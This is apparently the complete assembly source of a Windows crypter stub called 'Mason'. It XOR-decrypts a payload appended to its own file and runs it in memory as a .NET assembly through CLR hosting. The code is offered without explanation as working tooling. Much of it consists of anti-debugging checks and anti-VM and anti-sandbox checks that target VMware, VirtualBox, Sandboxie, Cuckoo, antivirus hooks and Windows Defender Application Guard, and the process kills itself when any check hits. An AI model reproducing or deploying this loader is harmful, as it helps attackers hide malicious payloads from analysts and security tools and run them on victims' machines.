format PE GUI 4.0
entry MasonEntry
include 'win32ax.inc'

section '.MasonI' import data readable

    library kernel32, 'kernel32.dll',\
            ole32, 'ole32.dll',\
            oleaut32, 'oleaut32.dll',\
            ntdll, 'ntdll.dll',\
            advapi32, 'advapi32.dll'

    import kernel32,\
        GetModuleFileNameA, 'GetModuleFileNameA',\
        CreateFileA, 'CreateFileA',\
        ReadFile, 'ReadFile',\
        CloseHandle, 'CloseHandle',\
        GetFileSize, 'GetFileSize',\
        VirtualAlloc, 'VirtualAlloc',\
        VirtualFree, 'VirtualFree',\
        ExitProcess, 'ExitProcess',\
        GetTickCount, 'GetTickCount',\
        IsDebuggerPresent, 'IsDebuggerPresent',\
        CheckRemoteDebuggerPresent, 'CheckRemoteDebuggerPresent',\
        OutputDebugStringA, 'OutputDebugStringA',\
        SetLastError, 'SetLastError',\
        GetLastError, 'GetLastError',\
        Sleep, 'Sleep',\
        LoadLibraryA, 'LoadLibraryA',\
        GetProcAddress, 'GetProcAddress',\
        GetModuleHandleA, 'GetModuleHandleA',\
        GetFileAttributesA, 'GetFileAttributesA',\
        CreateToolhelp32Snapshot, 'CreateToolhelp32Snapshot',\
        Process32First, 'Process32First',\
        Process32Next, 'Process32Next',\
        GetCurrentProcess, 'GetCurrentProcess',\
        TerminateProcess, 'TerminateProcess',\
        GetEnvironmentVariableA, 'GetEnvironmentVariableA'

    import ole32,\
        CoInitializeEx, 'CoInitializeEx'

    import oleaut32,\
        SafeArrayCreateVector, 'SafeArrayCreateVector',\
        SafeArrayAccessData, 'SafeArrayAccessData',\
        SafeArrayUnaccessData, 'SafeArrayUnaccessData',\
        SafeArrayDestroy, 'SafeArrayDestroy',\
        SafeArrayGetUBound, 'SafeArrayGetUBound'

    import ntdll,\
        NtQueryInformationProcess, 'NtQueryInformationProcess'

    import advapi32,\
        RegOpenKeyExA, 'RegOpenKeyExA',\
        RegCloseKey, 'RegCloseKey'

section '.MasonC' code readable executable

MasonEntry:
    push ebp
    mov ebp, esp
    sub esp, 200h

    invoke GetModuleFileNameA, 0, MasonPath, 260
    test eax, eax
    jz .MasonDie

    invoke CreateFileA, MasonPath, 80000000h, 1, 0, 3, 80h, 0
    cmp eax, -1
    je .MasonDie
    mov [MasonHFile], eax

    invoke GetFileSize, eax, 0
    cmp eax, 300
    jb .MasonDieCF
    mov [MasonFSz], eax

    invoke VirtualAlloc, 0, [MasonFSz], 3000h, 4
    test eax, eax
    jz .MasonDieCF
    mov [MasonFBuf], eax

    lea ecx, [ebp - 4]
    invoke ReadFile, [MasonHFile], [MasonFBuf], [MasonFSz], ecx, 0
    invoke CloseHandle, [MasonHFile]

    mov esi, [MasonFBuf]
    add esi, [MasonFSz]
    sub esi, 268

    mov eax, [esi]
    mov [MasonPayOff], eax
    mov eax, [esi + 4]
    mov [MasonPaySz], eax
    mov eax, [esi + 8]
    mov [MasonFlags], eax

    lea edi, [MasonKey]
    add esi, 12
    mov ecx, 256
    rep movsb

    mov eax, [MasonPayOff]
    add eax, [MasonPaySz]
    mov ecx, [MasonFSz]
    sub ecx, 268
    cmp eax, ecx
    ja .MasonDieVF

    invoke VirtualAlloc, 0, [MasonPaySz], 3000h, 4
    test eax, eax
    jz .MasonDieVF
    mov [MasonDecBuf], eax

    mov esi, [MasonFBuf]
    add esi, [MasonPayOff]
    mov edi, [MasonDecBuf]
    mov ecx, [MasonPaySz]
    xor edx, edx
.MasonXor:
    movzx eax, byte [esi + edx]
    mov ebx, edx
    and ebx, 0FFh
    xor al, [MasonKey + ebx]
    mov [edi + edx], al
    inc edx
    cmp edx, ecx
    jb .MasonXor

    invoke VirtualFree, [MasonFBuf], 0, 8000h

    test dword [MasonFlags], 2
    jz .MasonSkipAD
    call MasonAntiDebug
.MasonSkipAD:
    test dword [MasonFlags], 8
    jz .MasonSkipAV
    call MasonAntiVM
.MasonSkipAV:

    invoke CoInitializeEx, 0, 2

    invoke LoadLibraryA, MasonMscoree
    test eax, eax
    jz .MasonDieDec
    mov [MasonHMsc], eax

    invoke GetProcAddress, [MasonHMsc], MasonCCIName
    test eax, eax
    jz .MasonDieDec
    mov [MasonFnCCI], eax

    push MasonPtrMH
    push MasonIID_MH
    push MasonCLSID_MH
    call [MasonFnCCI]
    test eax, eax
    jnz .MasonDieDec

    mov ecx, [MasonPtrMH]
    mov edx, [ecx]
    push MasonPtrRI
    push MasonIID_RI
    push MasonRtVer
    push ecx
    call dword [edx + 0Ch]
    test eax, eax
    jnz .MasonDieDec

    mov ecx, [MasonPtrRI]
    mov edx, [ecx]
    push MasonPtrHost
    push MasonIID_CH
    push MasonCLSID_CH
    push ecx
    call dword [edx + 24h]
    test eax, eax
    jnz .MasonDieDec

    mov ecx, [MasonPtrHost]
    mov edx, [ecx]
    push ecx
    call dword [edx + 28h]

    mov ecx, [MasonPtrHost]
    mov edx, [ecx]
    push MasonPtrUnk
    push ecx
    call dword [edx + 34h]
    test eax, eax
    jnz .MasonDieDec

    mov ecx, [MasonPtrUnk]
    mov edx, [ecx]
    push MasonPtrDom
    push MasonIID_AD
    push ecx
    call dword [edx]
    test eax, eax
    jnz .MasonDieDec

    invoke SafeArrayCreateVector, 17, 0, [MasonPaySz]
    test eax, eax
    jz .MasonDieDec
    mov [MasonSAAsm], eax

    lea ecx, [ebp - 8]
    invoke SafeArrayAccessData, [MasonSAAsm], ecx
    mov edi, [ebp - 8]
    mov esi, [MasonDecBuf]
    mov ecx, [MasonPaySz]
    rep movsb
    invoke SafeArrayUnaccessData, [MasonSAAsm]

    invoke VirtualFree, [MasonDecBuf], 0, 8000h
    mov dword [MasonDecBuf], 0

    test dword [MasonFlags], 4
    jz .MasonSkipClr
    lea edi, [MasonKey]
    xor eax, eax
    mov ecx, 64
    rep stosd
.MasonSkipClr:

    mov ecx, [MasonPtrDom]
    mov edx, [ecx]
    push MasonPtrAsm
    push [MasonSAAsm]
    push ecx
    call dword [edx + 0B4h]
    test eax, eax
    jnz .MasonDieDec

    invoke SafeArrayDestroy, [MasonSAAsm]

    mov ecx, [MasonPtrAsm]
    mov edx, [ecx]
    push MasonPtrMI
    push ecx
    call dword [edx + 40h]
    test eax, eax
    jnz .MasonDieDec

    mov ecx, [MasonPtrMI]
    mov edx, [ecx]
    lea eax, [MasonSAParams]
    push eax
    push ecx
    call dword [edx + 48h]
    test eax, eax
    jnz .MasonNoParams
    cmp dword [MasonSAParams], 0
    jz .MasonNoParams
    lea ecx, [ebp - 0Ch]
    mov dword [ebp - 0Ch], 0
    invoke SafeArrayGetUBound, [MasonSAParams], 1, ecx
    mov eax, [ebp - 0Ch]
    inc eax
    mov [MasonNParams], eax
    invoke SafeArrayDestroy, [MasonSAParams]
    cmp dword [MasonNParams], 0
    jg .MasonHasParams
    jmp .MasonNoParams

.MasonHasParams:
    invoke SafeArrayCreateVector, 8, 0, 0
    mov [MasonSAStr], eax

    lea edi, [MasonVArg]
    xor eax, eax
    stosd
    stosd
    stosd
    stosd
    mov word [MasonVArg], 2008h
    mov eax, [MasonSAStr]
    mov dword [MasonVArg + 8], eax

    invoke SafeArrayCreateVector, 12, 0, 1
    mov [MasonSAPrm], eax

    lea ecx, [ebp - 8]
    invoke SafeArrayAccessData, [MasonSAPrm], ecx
    mov edi, [ebp - 8]
    lea esi, [MasonVArg]
    movsd
    movsd
    movsd
    movsd
    invoke SafeArrayUnaccessData, [MasonSAPrm]
    jmp .MasonDoInvoke

.MasonNoParams:
    invoke SafeArrayCreateVector, 12, 0, 0
    mov [MasonSAPrm], eax
    mov dword [MasonSAStr], 0

.MasonDoInvoke:
    lea edi, [MasonVNull]
    xor eax, eax
    stosd
    stosd
    stosd
    stosd

    lea edi, [MasonVRet]
    xor eax, eax
    stosd
    stosd
    stosd
    stosd

    mov ecx, [MasonPtrMI]
    mov edx, [ecx]
    lea eax, [MasonVRet]
    push eax
    push [MasonSAPrm]
    push dword [MasonVNull + 12]
    push dword [MasonVNull + 8]
    push dword [MasonVNull + 4]
    push dword [MasonVNull]
    push ecx
    call dword [edx + 94h]
    test eax, eax
    jz .MasonOK

    cmp dword [MasonSAPrm], 0
    jz @f
    invoke SafeArrayDestroy, [MasonSAPrm]
@@:
    cmp dword [MasonSAStr], 0
    jz @f
    invoke SafeArrayDestroy, [MasonSAStr]
@@:

    invoke SafeArrayCreateVector, 12, 0, 0
    mov [MasonSAPrm], eax
    mov dword [MasonSAStr], 0

    lea edi, [MasonVRet]
    xor eax, eax
    stosd
    stosd
    stosd
    stosd

    mov ecx, [MasonPtrMI]
    mov edx, [ecx]
    lea eax, [MasonVRet]
    push eax
    push [MasonSAPrm]
    push dword [MasonVNull + 12]
    push dword [MasonVNull + 8]
    push dword [MasonVNull + 4]
    push dword [MasonVNull]
    push ecx
    call dword [edx + 94h]

.MasonOK:
    cmp dword [MasonSAPrm], 0
    jz @f
    invoke SafeArrayDestroy, [MasonSAPrm]
@@:
    cmp dword [MasonSAStr], 0
    jz @f
    invoke SafeArrayDestroy, [MasonSAStr]
@@:

    mov ecx, [MasonPtrMI]
    test ecx, ecx
    jz @f
    mov edx, [ecx]
    push ecx
    call dword [edx + 8]
@@:
    mov ecx, [MasonPtrAsm]
    test ecx, ecx
    jz @f
    mov edx, [ecx]
    push ecx
    call dword [edx + 8]
@@:
    mov ecx, [MasonPtrDom]
    test ecx, ecx
    jz @f
    mov edx, [ecx]
    push ecx
    call dword [edx + 8]
@@:
    mov ecx, [MasonPtrUnk]
    test ecx, ecx
    jz @f
    mov edx, [ecx]
    push ecx
    call dword [edx + 8]
@@:
    mov ecx, [MasonPtrHost]
    test ecx, ecx
    jz @f
    mov edx, [ecx]
    push ecx
    call dword [edx + 8]
@@:

    invoke ExitProcess, 0

.MasonDieDec:
    cmp dword [MasonDecBuf], 0
    jz .MasonDie
    invoke VirtualFree, [MasonDecBuf], 0, 8000h
    jmp .MasonDie

.MasonDieVF:
    invoke VirtualFree, [MasonFBuf], 0, 8000h
    jmp .MasonDie

.MasonDieCF:
    invoke CloseHandle, [MasonHFile]

.MasonDie:
    invoke ExitProcess, 1

MasonAntiDebug:
    invoke IsDebuggerPresent
    test eax, eax
    jnz .MasonADKill

    mov eax, [fs:30h]
    movzx eax, byte [eax + 2]
    test eax, eax
    jnz .MasonADKill

    mov eax, [fs:30h]
    mov eax, [eax + 68h]
    and eax, 70h
    cmp eax, 70h
    je .MasonADKill

    lea ecx, [ebp - 10h]
    mov dword [ebp - 10h], 0
    invoke CheckRemoteDebuggerPresent, -1, ecx
    cmp dword [ebp - 10h], 0
    jne .MasonADKill

    lea ecx, [ebp - 10h]
    mov dword [ebp - 10h], 0
    lea edx, [ebp - 14h]
    invoke NtQueryInformationProcess, -1, 7, ecx, 4, edx
    cmp dword [ebp - 10h], 0
    jne .MasonADKill

    invoke SetLastError, 1234h
    invoke OutputDebugStringA, MasonDbgStr
    invoke GetLastError
    cmp eax, 1234h
    jne .MasonADKill

    invoke GetTickCount
    mov [ebp - 10h], eax
    invoke Sleep, 2
    invoke GetTickCount
    sub eax, [ebp - 10h]
    cmp eax, 500
    ja .MasonADKill

    ret
.MasonADKill:
    invoke ExitProcess, 0

MasonAntiVM:
    push ebx
    push ebp
    push edi

    mov eax, 40000000h
    cpuid
    cmp ebx, 'VMwa'
    je .MasonVMKill
    cmp ebx, 'KVMK'
    je .MasonVMKill
    cmp ebx, 'VBox'
    je .MasonVMKill
    cmp ebx, 'XenV'
    je .MasonVMKill
    cmp ebx, 'prlh'
    je .MasonVMKill

    lea eax, [MasonHKey]
    invoke RegOpenKeyExA, 80000002h, MasonRegVMW, 0, 20019h, eax
    test eax, eax
    jz .MasonVMRegHit

    lea eax, [MasonHKey]
    invoke RegOpenKeyExA, 80000002h, MasonRegVBOX, 0, 20019h, eax
    test eax, eax
    jz .MasonVMRegHit

    lea eax, [MasonHKey]
    invoke RegOpenKeyExA, 80000002h, MasonRegVBGA, 0, 20019h, eax
    test eax, eax
    jz .MasonVMRegHit

    lea eax, [MasonHKey]
    invoke RegOpenKeyExA, 80000002h, MasonRegSBox, 0, 20019h, eax
    test eax, eax
    jz .MasonVMRegHit

    jmp .MasonVMRegOK

.MasonVMRegHit:
    invoke RegCloseKey, dword [MasonHKey]
    jmp .MasonVMKill3

.MasonVMRegOK:

    invoke GetFileAttributesA, MasonFVmMouse
    cmp eax, -1
    jne .MasonVMKill3

    invoke GetFileAttributesA, MasonFVmHgfs
    cmp eax, -1
    jne .MasonVMKill3

    invoke GetFileAttributesA, MasonFVBoxMouse
    cmp eax, -1
    jne .MasonVMKill3

    invoke GetFileAttributesA, MasonFVBoxSF
    cmp eax, -1
    jne .MasonVMKill3

    invoke GetFileAttributesA, MasonFVBoxGuest
    cmp eax, -1
    jne .MasonVMKill3

    invoke GetModuleHandleA, MasonSbieDll
    test eax, eax
    jnz .MasonVMKill3

    invoke GetModuleHandleA, MasonCmdVrt
    test eax, eax
    jnz .MasonVMKill3

    invoke GetModuleHandleA, MasonCuckooDll
    test eax, eax
    jnz .MasonVMKill3

    invoke GetModuleHandleA, MasonAvghookDll
    test eax, eax
    jnz .MasonVMKill3

    invoke GetModuleHandleA, MasonSnxhkDll
    test eax, eax
    jnz .MasonVMKill3

    invoke GetModuleHandleA, MasonNtdllStr
    test eax, eax
    jz .MasonSkipWine
    invoke GetProcAddress, eax, MasonWineVer
    test eax, eax
    jnz .MasonVMKill3
.MasonSkipWine:

    invoke GetEnvironmentVariableA, MasonEnvUser, MasonEnvBuf, 128
    test eax, eax
    jz .MasonSkipWS
    cmp dword [MasonEnvBuf], 'WDAG'
    jne .MasonSkipWS
    cmp dword [MasonEnvBuf + 4], 'Util'
    je .MasonVMKill3
.MasonSkipWS:

    invoke GetFileAttributesA, MasonFWDAG
    cmp eax, -1
    jne .MasonVMKill3

    invoke CreateToolhelp32Snapshot, 2, 0
    cmp eax, -1
    je .MasonSkipProc
    mov ebp, eax
    xor edi, edi

    mov dword [MasonPE32], 296
    invoke Process32First, ebp, MasonPE32
    test eax, eax
    jz .MasonProcDone

.MasonProcLoop:
    inc edi
    invoke Process32Next, ebp, MasonPE32
    test eax, eax
    jnz .MasonProcLoop

.MasonProcDone:
    invoke CloseHandle, ebp
    cmp edi, 30
    jb .MasonVMKill3
.MasonSkipProc:

    rdtsc
    mov esi, eax
    mov ecx, 100000
.MasonVMLoop:
    dec ecx
    jnz .MasonVMLoop
    rdtsc
    sub eax, esi
    cmp eax, 10000000
    ja .MasonVMKill3

    pop edi
    pop ebp
    pop ebx
    ret

.MasonVMKill:
    pop edi
    pop ebp
    pop ebx
    jmp MasonForceKill
.MasonVMKill3:
    pop edi
    pop ebp
    pop ebx
    jmp MasonForceKill

MasonForceKill:
    invoke GetCurrentProcess
    invoke TerminateProcess, eax, 0

    invoke GetModuleHandleA, MasonNtdllStr
    test eax, eax
    jz .MasonKillC
    invoke GetProcAddress, eax, MasonNtTermProc
    test eax, eax
    jz .MasonKillC
    push 0
    push -1
    call eax

.MasonKillC:
    invoke ExitProcess, 0

    xor eax, eax
    mov dword [eax], 0DEADh

.MasonKillLoop:
    jmp .MasonKillLoop

section '.MasonD' data readable writeable

MasonPath     rb 260
MasonKey      rb 256
MasonDbgStr   db 'Mason', 0

MasonMscoree  db 'mscoree.dll', 0
MasonCCIName  db 'CLRCreateInstance', 0

MasonSbieDll   db 'SbieDll.dll', 0
MasonCmdVrt    db 'cmdvrt32.dll', 0
MasonCuckooDll db 'cuckoomon.dll', 0
MasonAvghookDll db 'avghookx.dll', 0
MasonSnxhkDll  db 'snxhk.dll', 0
MasonNtdllStr  db 'ntdll.dll', 0
MasonWineVer   db 'wine_get_version', 0

MasonRegVMW  db 'SOFTWARE\VMware, Inc.\VMware Tools', 0
MasonRegVBOX db 'SOFTWARE\Oracle\VirtualBox Guest Additions', 0
MasonRegVBGA db 'SYSTEM\CurrentControlSet\Services\VBoxGuest', 0
MasonRegSBox db 'SYSTEM\CurrentControlSet\Services\intelsbe', 0

MasonFVmMouse  db 'C:\windows\system32\drivers\vmmouse.sys', 0
MasonFVmHgfs   db 'C:\windows\system32\drivers\vmhgfs.sys', 0
MasonFVBoxMouse db 'C:\windows\system32\drivers\VBoxMouse.sys', 0
MasonFVBoxSF   db 'C:\windows\system32\drivers\VBoxSF.sys', 0
MasonFVBoxGuest db 'C:\windows\system32\drivers\VBoxGuest.sys', 0

MasonEnvUser   db 'USERNAME', 0
MasonFWDAG     db 'C:\Users\WDAGUtilityAccount', 0

MasonNtTermProc db 'NtTerminateProcess', 0

MasonRtVer du 'v4.0.30319', 0

MasonCLSID_MH dd 09280188Dh
              dw 00E8Eh, 04867h
              db 0B3h, 00Ch, 07Fh, 0A8h, 038h, 084h, 0E8h, 0DEh

MasonIID_MH dd 0D332DB9Eh
            dw 0B9B3h, 04125h
            db 082h, 007h, 0A1h, 048h, 084h, 0F5h, 032h, 016h

MasonIID_RI dd 0BD39D1D2h
            dw 0BA2Fh, 0486Ah
            db 089h, 0B0h, 0B4h, 0B0h, 0CBh, 046h, 068h, 091h

MasonCLSID_CH dd 0CB2F6723h
              dw 0AB3Ah, 011D2h
              db 09Ch, 040h, 000h, 0C0h, 04Fh, 0A3h, 00Ah, 03Eh

MasonIID_CH dd 0CB2F6722h
            dw 0AB3Ah, 011D2h
            db 09Ch, 040h, 000h, 0C0h, 04Fh, 0A3h, 00Ah, 03Eh

MasonIID_AD dd 005F696DCh
            dw 02B29h, 03663h
            db 0ADh, 08Bh, 0C4h, 038h, 09Ch, 0F2h, 0A7h, 013h

MasonHFile    dd 0
MasonFSz      dd 0
MasonFBuf     dd 0
MasonPayOff   dd 0
MasonPaySz    dd 0
MasonFlags    dd 0
MasonDecBuf   dd 0

MasonHMsc     dd 0
MasonFnCCI    dd 0
MasonHKey     dd 0
MasonPE32     dd 296
              rb 292
MasonEnvBuf   rb 128
MasonPtrMH    dd 0
MasonPtrRI    dd 0
MasonPtrHost  dd 0
MasonPtrUnk   dd 0
MasonPtrDom   dd 0
MasonSAAsm    dd 0
MasonPtrAsm   dd 0
MasonPtrMI    dd 0
MasonSAStr    dd 0
MasonSAPrm    dd 0
MasonSAParams dd 0
MasonNParams  dd 0

MasonVNull rb 16
MasonVArg  rb 16
MasonVRet  rb 16
